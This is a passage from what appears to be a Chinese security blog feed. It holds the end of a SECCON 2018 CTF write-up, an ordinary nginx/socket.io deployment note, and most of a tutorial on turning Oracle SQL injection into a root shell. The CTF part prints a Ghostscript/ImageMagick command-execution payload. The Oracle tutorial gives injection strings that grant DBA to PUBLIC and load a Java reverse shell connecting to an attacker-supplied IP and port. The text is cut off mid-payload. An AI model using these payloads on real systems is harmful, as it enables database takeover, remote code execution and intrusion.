s.get(vul.format(t))</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;运行后就能得到cookie中的一个值，然后逐一爆破。<br><div align="center"><br>    <img src="/images/posts/seccon2018/11.png"><br></div><br>&emsp;&emsp;这里需要根据服务器返回的值手动更新<code>[value^=&quot;%s&quot;]</code>。最后会得到如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[value^=&quot;48393e942c8ec6e114ab99%s&quot;]</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;将cookie置换后就能开启上传功能：<br><div align="center"><br>    <img src="/images/posts/seccon2018/12.png"><br></div><br><div align="center"><br>    <img src="/images/posts/seccon2018/13.png"><br></div><br>&emsp;&emsp;我上传一个<code>错误</code>的jpg。<br><div align="center"><br>    <img src="/images/posts/seccon2018/14.png"><br></div><p>&emsp;&emsp;点击转换成<code>GIF</code>，可以得到一堆报错信息：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert: Not a JPEG file: starts with 0x61 0x61 `/var/www/html/images/b3478fc02b23bdd897320b688a086b40.jpg&apos; @ error/jpeg.c/JPEGErrorHandler/316. convert: no images defined</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;拿去Google，可以找到这是<code>ImageMagick</code>的框架，而ImageMagick又爆出过很多漏洞，所以我们可以找找可利用的exp。</p><p>&emsp;&emsp;这里真正的漏洞在<code>GhostScript</code>，被ImageMagick用来转换、裁剪图片。我们可以在exploit-database中找到利用脚本。链接：<a href="https://www.exploit-db.com/exploits/45243/" target="_blank">https://www.exploit-db.com/exploits/45243/</a>。</p><p>&emsp;&emsp;POC如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This one works for me on the version in Ubuntu:</span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> cat shellexec.jpeg</span></span><br><span class="line"><span class="hljs-meta">%</span><span class="hljs-bash">!PS</span></span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br><span class="line"></span><br><span class="line">For CentOS, try this:</span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> cat shellexec.jpeg</span></span><br><span class="line"><span class="hljs-meta">%</span><span class="hljs-bash">!PS</span></span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里我们要使用centos的版本，上传poc后：</p><div align="center"><br>    <img src="/images/posts/seccon2018/15.png"><br></div><p>&emsp;&emsp;get flag：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%cat ./FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;</p><p><div align="center"><br>    <img src="/images/posts/seccon2018/16.png"><br></div><br>&emsp;&emsp;SECCON{CSSinjection+GhostScript/ImageMagickRCE}</p><p>&emsp;&emsp;flag也说明了这道题的考点。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;赛后复现&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】部署nodejs+socket.io+nginx (https)</title>
    <link href="http://yoursite.com/2018/10/Nginx-nodejs-socket/"/>
    <id>http://yoursite.com/2018/10/Nginx-nodejs-socket/</id>
    <published>2018-10-12T08:47:56.000Z</published>
    <updated>2018-11-23T12:46:02.506Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;此文记录一下nodejs+nginx部署的方案。<br><a id="more"></a></p><p>&emsp;&emsp;首先在服务端假如使用了socket.io，并且相关代码如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);</span><br><span class="line">global.express = express;</span><br><span class="line">global.app = express();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> io = <span class="hljs-built_in">require</span>(<span class="hljs-string">'socket.io'</span>);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">'web server listen on 127.0.0.1:8000'</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> server = global.app.listen(<span class="hljs-number">8000</span>, <span class="hljs-string">'127.0.0.1'</span>);</span><br><span class="line"></span><br><span class="line">global.io = io(server,&#123;</span><br><span class="line">    upgrade: <span class="hljs-literal">false</span>,</span><br><span class="line">    transports: [<span class="hljs-string">'websocket'</span>],</span><br><span class="line">    reconnection: <span class="hljs-literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;此时我们将<code>socket.io</code>的监听绑定到<code>express</code>上，这样避免了重新开辟一条通路。</p><p>&emsp;&emsp;接着在<code>/etc/nginx/conf.d/</code>下创建一个站点的配置文件：<br><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">upstream www &#123;</span><br><span class="line">    server 127.0.0.1:8000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    # 修改为自己的域名</span><br><span class="line">    server_name www.example.cn;</span><br><span class="line">    # 301 重定向</span><br><span class="line">    return 301 https://www.example.cn$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 443;</span><br><span class="line">    server_name www.example.cn;</span><br><span class="line">    ssl on;</span><br><span class="line">    # 证书路径不要写错</span><br><span class="line">    ssl_certificate /etc/nginx/ssl/1_example.cn_bundle.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/ssl/2_example.cn.key;</span><br><span class="line">    ssl_session_timeout 5m;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">    if ($ssl_protocol = "") &#123;</span><br><span class="line">    rewrite ^(.*) https://$host$1 permanent;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        # WebSocket 配置</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection "upgrade";</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host  $http_host;</span><br><span class="line">        proxy_set_header X-Real-IP  $remote_addr;  </span><br><span class="line">        proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Nginx-proxy true;</span><br><span class="line">        # 这里也要修改为你的二级域名前缀</span><br><span class="line">        proxy_pass http://www;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;检查配置文件是否正确：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nginx -t</span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;重新启动Nginx：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;此时我们就能使用HTTPS下的websocket了。</p><p>&emsp;&emsp;为了让我们的服务更加的稳定，可以使用<code>pm2</code>来管理node项目。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install pm2 -g</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;此文记录一下nodejs+nginx部署的方案。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Oracle 从sqli到get (root) shell</title>
    <link href="http://yoursite.com/2018/10/oracle-sqli-get-shell/"/>
    <id>http://yoursite.com/2018/10/oracle-sqli-get-shell/</id>
    <published>2018-10-02T08:47:56.000Z</published>
    <updated>2018-11-23T12:47:04.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;本文记录一下oracle从SQLi到get (root) shell的过程。首发于<code>T00ls</code>。<br><a id="more"></a><br>&emsp;&emsp;首先我们需要一个oracle的一个注入点，oracle一般被用于大型企业或组织的数据库，所以它里面的权限划分、表间关系就变得尤其复杂，有时候即使能注出用户表也会存在<code>password</code>列做了视图或多表联合，导致拿不到真实的<code>password</code>。所以我们有必要对oracle数据库的信息做探测，我们可以通过sqlmap提供的<code>自定义SQL语句</code>执行这个功能探测一下用户权限、视图等信息，这里使用<code>--sql-query</code>：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--sql-query=QUERY   SQL statement to be executed</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">sqlmap -u "http://www.xxxx.com/index.php?ID=111" --sql-query "select username from users"</span><br></pre></td></tr></table></figure></p><h2 id="Oracle相关权限"><a href="#Oracle相关权限" class="headerlink" title="Oracle相关权限"></a>Oracle相关权限</h2><h3 id="session-privs"><a href="#session-privs" class="headerlink" title="session_privs"></a>session_privs</h3><p>&emsp;&emsp;oracle中我们可以通过查询<code>session_privs</code>表得到当前用户的权限，如：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">-- sqlmap output</span></span><br><span class="line"><span class="hljs-keyword">select</span> PRIVILEGE <span class="hljs-keyword">from</span> session_privs [<span class="hljs-number">19</span>]:</span><br><span class="line">[*] <span class="hljs-keyword">ADMINISTER</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">TRIGGER</span></span><br><span class="line">[*] <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">INDEX</span></span><br><span class="line">[*] <span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">TABLE</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">INDEX</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">VIEW</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> CLUSTER</span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">INDEXTYPE</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OPERATOR</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">SEQUENCE</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">SESSION</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span></span><br><span class="line">[*] <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TYPE</span></span><br><span class="line">[*] <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">TABLE</span></span><br><span class="line">[*] <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">INDEX</span></span><br><span class="line">[*] <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">TABLE</span></span><br><span class="line">[*] <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">ANY</span> <span class="hljs-keyword">TABLE</span></span><br><span class="line">[*] <span class="hljs-keyword">UNLIMITED</span> <span class="hljs-keyword">TABLESPACE</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里我们重点注意这个<code>UNLIMITED TABLESPACE</code>权限，这个权限很高，高到可以满足我们后面执行<code>java</code>代码，导致任意代码执行、反弹shell。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unlimited tablespace是隐含在dba, resource角色中的一个系统权限</span><br><span class="line"></span><br><span class="line">一般DBA要把这个 UNLIMITED TABLESPACE权限关掉</span><br></pre></td></tr></table></figure></p><h3 id="USER-CONSTRAINTS"><a href="#USER-CONSTRAINTS" class="headerlink" title="USER_CONSTRAINTS"></a>USER_CONSTRAINTS</h3><p>&emsp;&emsp;引用docs.oracle:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER_CONSTRAINTS describes all constraint definitions on tables owned by the current user. Its columns are the same as those in &quot;ALL_CONSTRAINTS&quot;.</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>USER_CONSTRAINTS</code>存放了当前用户表的所有约束定义。所以我们可以通过这个查看当前用户表里是否存在对password的约束：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> constraint_name, constraint_type, table_name,index_name,search_condition, r_constraint_name <span class="hljs-keyword">from</span> user_constraints <span class="hljs-keyword">where</span> table_name = <span class="hljs-keyword">upper</span>(<span class="hljs-string">'YHB'</span>)</span><br><span class="line"></span><br><span class="line">[*] SYS_C007280, C, YHB,  , <span class="hljs-keyword">None</span>,  </span><br><span class="line">[*] SYS_C007281, C, YHB,  , <span class="hljs-keyword">None</span>,  </span><br><span class="line">[*] SYS_C007282, P, YHB, SYS_C000082, <span class="hljs-keyword">None</span>,</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以看到当前表下有三个约束条件。</p><h3 id="user-cons-columns"><a href="#user-cons-columns" class="headerlink" title="user_cons_columns"></a>user_cons_columns</h3><blockquote><p>USER_CONS_COLUMNS describes columns that are owned by the current user and that are specified in constraint definitions. Its columns are the same as those in “ALL_CONS_COLUMNS”.</p></blockquote><p>&emsp;&emsp;查到约束名称后我们可以通过<code>user_cons_columns</code>查看当前用户拥有且在约束定义中指定的列。也就是得到约束作用的列（字段）。如：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> ower,table_name,column_name <span class="hljs-keyword">from</span> user_cons_columns <span class="hljs-keyword">where</span> constraint_name=<span class="hljs-string">'SYS_C000280'</span></span><br><span class="line"></span><br><span class="line">[*] <span class="hljs-keyword">PASSWORD</span></span><br><span class="line">[*] YHB</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里明显看到有一个对password的约束，当你在dump用户表的时候如果发现password是none或者null，那么就有可能是因为约束的原因。</p><h3 id="user-views"><a href="#user-views" class="headerlink" title="user_views"></a>user_views</h3><blockquote><p>USER_VIEWS describes the views owned by the current user. Its columns (except for OWNER) are the same as those in ALL_VIEWS.</p></blockquote><p>&emsp;&emsp;<code>user_views</code>描述了当前用户拥有的视图。视图是oracle的一个重要组成部分，它使复杂查询SQL变得简单有效。<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">replace</span> <span class="hljs-keyword">view</span> v_complex</span><br><span class="line"><span class="hljs-keyword">as</span></span><br><span class="line"><span class="hljs-keyword">select</span> table1.ename, table1.job, table2.dname <span class="hljs-keyword">from</span> table1, dept <span class="hljs-keyword">where</span> table1.deptno=table2.deptno</span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-keyword">check</span> <span class="hljs-keyword">option</span> ;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;如上就把两个table做了一个联合查询的视图，具体的可以另寻参考。</p><p>&emsp;&emsp;在渗透中我们可以使用如下进行查询：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> VIEW_NAME,TEXT_LENGTH,<span class="hljs-built_in">TEXT</span> <span class="hljs-keyword">from</span> user_views [<span class="hljs-number">224</span>]:</span><br><span class="line"><span class="hljs-comment">-- 省略</span></span><br></pre></td></tr></table></figure></p><h2 id="Java代码执行"><a href="#Java代码执行" class="headerlink" title="Java代码执行"></a>Java代码执行</h2><p>&emsp;&emsp;在得到目标的基本信息后我们可以利用oracle对Java的支持进行<code>Java代码执行</code>。</p><p>&emsp;&emsp;前面说了<code>UNLIMITED TABLESPACE</code>可以满足我们代码执行的条件。如果权限不够的话可以通过下面的语句进行提权：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">IMMEDIATE</span> <span class="hljs-string">''</span><span class="hljs-keyword">DECLARE</span> <span class="hljs-keyword">PRAGMA</span> AUTONOMOUS_TRANSACTION;<span class="hljs-keyword">BEGIN</span> <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">IMMEDIATE</span> <span class="hljs-string">''''</span><span class="hljs-keyword">grant</span> dba <span class="hljs-keyword">to</span> <span class="hljs-keyword">public</span><span class="hljs-string">''''</span>;<span class="hljs-keyword">END</span>;'';<span class="hljs-keyword">END</span>;<span class="hljs-comment">--','SYS',0,'1',0)) is not null--</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;执行后可能会报这个错误：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器无法处理请求。 --&amp;gt; ORA-06550: line 1, column 7:</span><br><span class="line">PLS-00201: identifier &apos;SYS.DBMS _OUTPUT&apos; must be declared</span><br><span class="line">ORA-06550: line 1, column 7:</span><br><span class="line">PL/SQL: Statement ignored</span><br><span class="line">ORA-06512: at &quot;SYS.DBMS_EXPORT_EXTENSION&quot;, line 360</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;但在这个例子中并不会影响到我的操作，如果需要解决这个错误可以Google一下。</p><p>&emsp;&emsp;接着使用<code>java 反弹shell</code>。</p><h3 id="创建Java反弹代码"><a href="#创建Java反弹代码" class="headerlink" title="创建Java反弹代码"></a>创建Java反弹代码</h3><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (<span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">'FOO'</span>,<span class="hljs-string">'BAR'</span>,<span class="hljs-string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell&#123;public static void run() throws Exception &#123;Socket s = new Socket("&#123;your_ip&#125;", &#123;your_port&#125;);Process p = Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();&#125;static class T extends Thread &#123;private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) &#123;this.u = out;this.i = in;&#125;public void run() &#123;BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try &#123;while ((l = n.read(f, 0, f.length)) &gt; 0) &#123;w.write(f, 0, l);w.flush();&#125;&#125; catch (IOException e) &#123;&#125;try &#123;if (n != null)n.close();if (w != null)w.close();&#125; catch (Exception e) &#123;&#125;&#125;&#125;&#125;'''';END;'';END;--'</span>,<span class="hljs-string">'SYS'</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><span class="hljs-comment">--</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;格式化代码后就是如下语句：<br><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.io.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.net.*;</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shell</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Socket s = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">"&#123;your_ip&#125;"</span>, &#123;your_port&#125;);</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="hljs-string">"C:/Windows/System32/cmd.exe"</span>);</span><br><span class="line">        <span class="hljs-keyword">new</span> T(p.getInputStream(), s.getOutputStream()).start();</span><br><span class="line">        <span class="hljs-keyword">new</span> T(p.getErrorStream(), s.getOutputStream()).start();</span><br><span class="line">        <span class="hljs-keyword">new</span> T(s.getInputStream(), p.getOutputStream()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">private</span> InputStream i;</span><br><span class="line">        <span class="hljs-keyword">private</span> OutputStream u;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">T</span><span class="hljs-params">(InputStream in , OutputStream out)</span> </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">this</span>.u = out;</span><br><span class="line">            <span class="hljs-keyword">this</span>.i = in ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">            BufferedReader n = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(i));</span><br><span class="line">            BufferedWriter w = <span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> OutputStreamWriter(u));</span><br><span class="line">            <span class="hljs-keyword">char</span> f[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">8192</span>];</span><br><span class="line">            <span class="hljs-keyword">int</span> l;</span><br><span class="line">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">while</span> ((l = n.read(f, <span class="hljs-number">0</span>, f.length)) &gt; <span class="hljs-number">0</span>) &#123;</span><br><span class="line">                    w.write(f, <span class="hljs-number">0</span>, l);</span><br><span class="line">                    w.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">if</span> (n != <span class="hljs-keyword">null</span>) n.close();</span><br><span class="line">                <span class="hljs-keyword">if</span> (w != <span class="hljs-keyword">null</span>) w.close();</span><br><span class="line">            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这里要注意区分目标系统，如果是linux就要改变执行的命令，否则会报：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器无法处理请求。 --&amp;gt; ORA-29532: Java call terminated by uncaught Java exception: java.io.IOException: can&apos;t exec: cmd.exe doesn&apos;t exist</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;此时尝试换成<code>/bin/bash</code>。<br>&emsp;&emsp;</p><h3 id="赋予Java可执行权限"><a href="#赋予Java可执行权限" class="headerlink" title="赋予Java可执行权限"></a>赋予Java可执行权限</h3><p>&emsp;&emsp;上面只是相当于写了个文件，我们还需要给它加上可执行权限：<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (<span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span 